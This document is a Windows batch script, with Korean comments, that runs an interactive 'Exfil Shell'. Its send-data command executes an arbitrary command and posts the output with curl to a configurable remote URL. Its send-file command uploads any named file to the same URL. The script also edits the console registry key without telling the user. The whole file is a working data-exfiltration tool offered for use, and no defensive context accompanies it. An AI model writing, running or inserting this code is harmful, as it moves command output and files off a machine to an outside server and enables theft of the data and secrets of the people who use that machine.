@echo off
setlocal enabledelayedexpansion
chcp 65001 > nul

:: ANSI 활성화
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f > nul 2>&1

:: ESC 문자 주입 (0x1B)
for /f %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"

set "GREEN=%ESC%[32m"
set "RED=%ESC%[31m"
set "YELLOW=%ESC%[33m"
set "RESET=%ESC%[0m"

set BASE_URL=http://0.0.0.0:12345

echo ==========================================
echo   Exfil Shell  ^|  !BASE_URL!
echo ==========================================
echo  send-data "command"     : execute and send
echo  send-file "filepath"    : send file
echo  set-url   "http://..."  : change target URL
echo  exit                    : quit
echo ==========================================
echo.

:loop
set "INPUT="
set /p "INPUT=> "

:: 빈 입력 무시
if not defined INPUT goto loop

:: exit
if /i "!INPUT!"=="exit" goto :end

:: set-url (데이터를 전송할 URL/PORT 입력)
set "MATCHED="
echo(!INPUT! | findstr /i "^set-url" > nul && set "MATCHED=1"
if defined MATCHED (
    set "NEW_URL=!INPUT:~8!"
    set "NEW_URL=!NEW_URL:"=!"
    if not defined NEW_URL (
        echo !RED![-] URL cannot be empty.!RESET!
        goto loop
    )
    set "BASE_URL=!NEW_URL!"
    echo !YELLOW![*] URL changed : !BASE_URL!!RESET!
    goto loop
)

:: send-data
set "MATCHED="
echo(!INPUT! | findstr /i "^send-data" > nul && set "MATCHED=1"
if defined MATCHED (
    set "CMD=!INPUT:~10!"
    set "CMD=!CMD:"=!"
    if not defined CMD (
        echo !RED![-] No command specified.!RESET!
        goto loop
    )

    for /f "tokens=1" %%a in ("!CMD!") do set "BIN=%%a"
    echo(!BIN! | findstr /i "\." > nul
    if !errorlevel!==0 ( set "FNAME=!BIN!" ) else ( set "FNAME=!BIN!.txt" )

    set "TMPFILE=%TEMP%\exfil_tmp.txt"
    echo ===cmd: !CMD!=== > "!TMPFILE!"
    !CMD! >> "!TMPFILE!" 2>&1

    curl.exe -s -o nul -w "%%{http_code}" -X POST !BASE_URL!/!FNAME! -d @"!TMPFILE!" > "%TEMP%\status.txt" 2> "%TEMP%\curl_err.txt"
    if !errorlevel! neq 0 (
        set /p "CURL_ERR="<"%TEMP%\curl_err.txt"
        echo !RED![-] curl error : !CURL_ERR!!RESET!
        del "!TMPFILE!" > nul 2>&1
        goto loop
    )

    set /p "STATUS="<"%TEMP%\status.txt"
    if "!STATUS!"=="200" (
        echo !GREEN![+] Success : !FNAME! sent  ^| !BASE_URL!/!FNAME!!RESET!
    ) else (
        echo !RED![-] Failed  : HTTP !STATUS!  ^| !BASE_URL!/!FNAME!!RESET!
    )
    del "!TMPFILE!" > nul 2>&1
    goto loop
)

:: send-file
set "MATCHED="
echo(!INPUT! | findstr /i "^send-file" > nul && set "MATCHED=1"
if defined MATCHED (
    set "FPATH=!INPUT:~10!"
    set "FPATH=!FPATH:"=!"
    if not defined FPATH (
        echo !RED![-] No file path specified.!RESET!
        goto loop
    )
    if not exist "!FPATH!" (
        echo !RED![-] File not found : !FPATH!!RESET!
        goto loop
    )

    for %%a in ("!FPATH!") do set "FNAME=%%~nxa"

    curl.exe -s -o nul -w "%%{http_code}" -X POST !BASE_URL!/!FNAME! -F "file=@!FPATH!" > "%TEMP%\status.txt" 2> "%TEMP%\curl_err.txt"
    if !errorlevel! neq 0 (
        set /p "CURL_ERR="<"%TEMP%\curl_err.txt"
        echo !RED![-] curl error : !CURL_ERR!!RESET!
        goto loop
    )

    set /p "STATUS="<"%TEMP%\status.txt"
    if "!STATUS!"=="200" (
        echo !GREEN![+] Success : !FNAME! sent  ^| !BASE_URL!/!FNAME!!RESET!
    ) else (
        echo !RED![-] Failed  : HTTP !STATUS!  ^| !BASE_URL!/!FNAME!!RESET!
    )
    goto loop
)

:: 알 수 없는 명령어
echo !RED![-] Unknown command. Use send-data, send-file, set-url, or exit.!RESET!
goto loop

:end
echo !YELLOW![*] Bye.!RESET!
endlocal